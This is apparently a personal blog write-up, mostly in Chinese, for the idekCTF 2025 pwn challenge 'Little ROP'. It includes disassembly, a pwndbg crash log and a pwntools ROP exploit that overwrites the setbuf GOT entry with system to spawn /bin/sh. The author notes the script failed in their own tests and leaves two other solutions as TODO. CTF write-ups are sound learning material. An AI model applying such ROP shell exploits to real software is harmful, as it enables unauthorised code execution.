---
title: "Write-ups: idekCTF 2025"
published: 2025-09-19
updated: 2025-09-19
description: "Write-ups for idekCTF 2025 pwn aspect."
image: "https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.2h8mjvhi43.avif"
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# Little ROP

## Information

- Category: Pwn
- Points: 362

## Description

> No PIE, no canary. Perfect setup for ROP. Show me what you can do!

## Write-up 1

840+ 支队伍，结果这题只有 27 个解，说实话一开始以为是签到题，结果没想到那么难……总之这题质量还是不错的，后期一定要回头深挖一下……

这题解法还挺多的，据我所知就有三种方法，我这里依次记录，就叫 Write-ups 1, 2, 3 吧，学习一下。

首先这个方法 1，也是我当时想到的方法，就是覆盖 `setbuf` 的 got 表为 one_gadget 的地址。但是后来发现找不到合适的 one_gadget……

这里记录的是和这个方法差不多的变体，注意到下面这个函数里面分别调用了三次 setbuf，用到了两个参数，其中 `stdin`, `stdout`, `stderr` 都位于 bss 段，作为 rdi 的参数。

```c
void __fastcall setup(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
}
```

这就给了我们一个控制 rdi 的 gadget，我们可以把 `/bin/sh` 写在已知的地址，选一个 rdi gadget 用于设置 rdi 。

```asm
; Attributes: bp-based frame

; void __fastcall setup(int argc, const char **argv, const char **envp)
public setup
setup proc near
; __unwind {
endbr64
push    rbp
mov     rbp, rsp
mov     rax, cs:stdin@GLIBC_2_2_5
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setbuf
mov     rax, cs:stdout@GLIBC_2_2_5
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setbuf
mov     rax, cs:stderr@GLIBC_2_2_5
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setbuf
nop
pop     rbp
retn
; } // starts at 401156
setup endp
```

之后我们 partial overwrite setbuf 的低三字节为 `system` 的偏移，就有 $1/16$ 的概率命中 system 。

但是实际调试的时候发现在进入 `do_system` 后的栈操作会将我们本就不高的栈地址一直缩小，最后 RSP 变成了只读地址，然后向只读地址之写入数据，导致访问不可写地址而 abort 。

```asm showLineNumbers=false
Program received signal SIGSEGV, Segmentation fault.
0x00007fee1bf5b93e in do_system (line=0x404010 "") at ../sysdeps/posix/system.c:102
102 in ../sysdeps/posix/system.c
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0xcdd2ecfdc1a6800
 RBX  0x404010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0
 RCX  0x7fee1c01f7e2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  1
 RDI  0x404010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0
 RSI  0
 R8   0x7fee1c126f10 (initial+16) ◂— 4
 R9   0x7fee1c147040 (_dl_fini) ◂— endbr64
 R10  0x7fee1bf115e8 ◂— 0xf001200001a64
 R11  0x246
 R12  0x7fff1d8a7218 —▸ 0x7fff1d8a7edb ◂— '/home/user/chall'
 R13  0x7fee1c1277a0 (quit) ◂— 0
 R14  0x7fee1c127840 (intr) ◂— 0
 R15  0x7fee1c17b040 (_rtld_global) —▸ 0x7fee1c17c2e0 ◂— 0
 RBP  0
 RSP  0x403c80 ◂— 0
 RIP  0x7fee1bf5b93e (do_system+62) ◂— mov qword ptr [rsp + 0x378], rax
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
   0x7fee1bf5b926 <do_system+38>     punpcklqdq xmm1, xmm2
   0x7fee1bf5b92a <do_system+42>     push   rbx
   0x7fee1bf5b92b <do_system+43>     mov    rbx, rdi
   0x7fee1bf5b92e <do_system+46>     sub    rsp, 0x388
   0x7fee1bf5b935 <do_system+53>     mov    rax, qword ptr fs:[0x28]               RAX, [0x7fee1bf08768]
 ► 0x7fee1bf5b93e <do_system+62>     mov    qword ptr [rsp + 0x378], rax           [0x403ff8] <= 0xcdd2ecfdc1a6800
   0x7fee1bf5b946 <do_system+70>     xor    eax, eax                               EAX => 0
   0x7fee1bf5b948 <do_system+72>     mov    dword ptr [rsp + 0x18], 0xffffffff     [0x403c98] <= 0xffffffff
   0x7fee1bf5b950 <do_system+80>     mov    qword ptr [rsp + 0x180], 1             [0x403e00] <= 1
   0x7fee1bf5b95c <do_system+92>     mov    dword ptr [rsp + 0x208], 0             [_DYNAMIC+104] <= 0
   0x7fee1bf5b967 <do_system+103>    mov    qword ptr [rsp + 0x188], 0             [0x403e08] <= 0
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x403c80 ◂— 0
... ↓        7 skipped
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x7fee1bf5b93e do_system+62
   1         0x401186 setup+48
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap 0x403c80+0x378
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
          0x402000           0x403000 r--p     1000   4000 chall_patched
►         0x403000           0x404000 r--p     1000   4000 chall_patched +0xff8
          0x404000           0x405000 rw-p     1000   5000 chall_patched
```

解决方法是在覆盖 setbuf 之后那个 read 执行完栈迁移后再想办法给它迁移到更高的地址去，但是覆盖 setbuf 后继续写 rop 的话会破坏 setbuf 的高位地址……不知道是不是 skill 问题，反正就是有问题……

所以我还有一个想法就是，或许第一次 setbuf 先覆盖为 puts 的地址，泄漏 got 中的 libc，然后再用原先的方式控制 rdi，执行 system 。太懒了，下次再研究……

虽然我测试是失败了，无论是本地还是远程调试 docker 内的 chall，但比赛当天有人用同样的思路，打通了……很奇怪，感觉不可思议……

## Exploit 1

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)

FILE = "./chall"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = ELF("./libc.so.6")


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    read = 0x4011A9
    leave_ret = 0x4011C0
    ret = 0x4011C1
    control_rdi = 0x401186
    store_binsh = 0x404080
    binsh = 0x404068
    system = libc.sym["system"]

    target.success(f"system: {hex(system)}")
    target.success(f"setbuf@got: {hex(elf.got['setbuf'])}")

    payload = flat(
        b"A" * 32,
        store_binsh,  # first_read rbp (store /bin/sh in `store_binsh - 0x20`)
        read,
        binsh,
        b"/bin/sh\x00",
        b"B" * 0x10,
        store_binsh - 0x30,  # rbp (for more ROP) 0x404040
        read,
        b"C" * 0x10,
        control_rdi,
        b"D" * 0x8,
        elf.got["setbuf"] + 0x20,  # rbp
        read,  # after this, pivot to higher stack...? seems impossible !
        b"\x70\x0d\x05",  # system
    )
    raw_input("DEBUG")
    target.send(payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

## Write-up 2

据说预期解是 `ret2lresolve`，崩溃，留作 TODO，有空再研究。

## Exploit 2

TODO

## Write-up 3

还有一个解是使用 `add dword ptr [rbp - 0x3d], ebx; nop; ret` gadget，后面有空再研究，崩溃的我现在只想躺床上睡一天……

## Exploit 3

TODO
